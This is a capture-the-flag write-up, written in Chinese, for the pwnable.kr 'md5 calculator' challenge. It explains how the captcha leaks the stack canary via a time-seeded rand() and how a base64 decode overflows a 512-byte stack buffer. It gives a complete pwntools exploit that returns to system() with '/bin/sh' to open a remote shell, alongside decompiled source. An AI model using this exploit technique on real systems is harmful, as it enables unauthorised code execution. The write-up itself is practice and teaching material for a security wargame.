# md5 calculator

hash 可以做計算，因為用時間當seed 

process_hash  g_buf 吃 1024 ，之後在 decode 資料會變長，但分配的只有 512 的長度 存在 overflow  並且是在 bss 上

canary 可以藉由 hash 算出，因為hash 計算就有用到 canary

所以可以把 /bin/sh 字串寫在 bss， ret 跳到 system 並且計算 bss 位置，讓system 可以拿到 /bin/sh

```
.bss:0804B0E0                 public g_buf
.bss:0804B0E0 ; char g_buf[1024]
.bss:0804B0E0 g_buf           db 400h dup(?)          ; DATA XREF: process_hash+39↑o
.bss:0804B0E0                                         ; process_hash+5F↑o ...
.bss:0804B0E0 _bss            ends
```

exploit

```python
from pwn import *
from ctypes import *
from ctypes.util import find_library

context(log_level="debug")

system = ELF("./hash").symbols['system']
g_buf = 0x804b0e0


libc = CDLL(find_library("libcrypto.so.1.0.0"))
libc.srand(libc.time(0))

#p = process("./hash")
p = remote("pwnable.kr", 9002)


rval = [libc.rand() for i in range(8)]

captcha = p.recvuntil("captcha : ")
captcha = p.recvuntil("\n")
canary = int(captcha) - rval[1] - rval[2] + rval[3] - rval[4] - rval[5] + rval[6] - rval[7]
canary = canary & 0xffffffff
log.info(hex(canary))

p.send(captcha)

payload = b"A"*0x200
payload += p32(canary)
payload += b"A"*0xc
payload += p32(system)
payload += b"A"*0x4
payload += p32(g_buf+0x2d0)

payload = b64e(payload)

log.info(payload)

p.recvuntil("Encode your data with BASE64 then paste me!")

p.sendline( payload + "/bin/sh\x00" )

p.interactive()

```


source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [esp+18h] [ebp-8h]
  int v6; // [esp+1Ch] [ebp-4h]

  setvbuf(stdout, 0, 1, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("- Welcome to the free MD5 calculating service -");
  v3 = time(0);
  srand(v3);
  v6 = my_hash();
  printf("Are you human? input captcha : %d\n", v6);
  __isoc99_scanf("%d", &v5);
  if ( v6 != v5 )
  {
    puts("wrong captcha!");
    exit(0);
  }
  puts("Welcome! you are authenticated.");
  puts("Encode your data with BASE64 then paste me!");
  process_hash();
  puts("Thank you for using our service.");
  system("echo `date` >> log");
  return 0;
}

int my_hash()
{
  signed int i; // [esp+0h] [ebp-38h]
  char v2[4]; // [esp+Ch] [ebp-2Ch]
  int v3; // [esp+10h] [ebp-28h]
  int v4; // [esp+14h] [ebp-24h]
  int v5; // [esp+18h] [ebp-20h]
  int v6; // [esp+1Ch] [ebp-1Ch]
  int v7; // [esp+20h] [ebp-18h]
  int v8; // [esp+24h] [ebp-14h]
  int v9; // [esp+28h] [ebp-10h]
  unsigned int v10; // [esp+2Ch] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v2[4 * i] = rand();
  return v6 - v8 + v9 + v10 + v4 - v5 + v3 + v7;
}

unsigned int process_hash()
{
  int v0; // ST14_4
  char *ptr; // ST18_4
  char v3; // [esp+1Ch] [ebp-20Ch]
  unsigned int v4; // [esp+21Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  memset(&v3, 0, 0x200u);
  while ( getchar() != 10 )
    ;
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 1024, stdin);
  memset(&v3, 0, 0x200u);
  v0 = Base64Decode(g_buf, (int)&v3); 
  ptr = calc_md5((int)&v3, v0);     // 0x200 = 512 can overflow
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return __readgsdword(0x14u) ^ v4;
}

```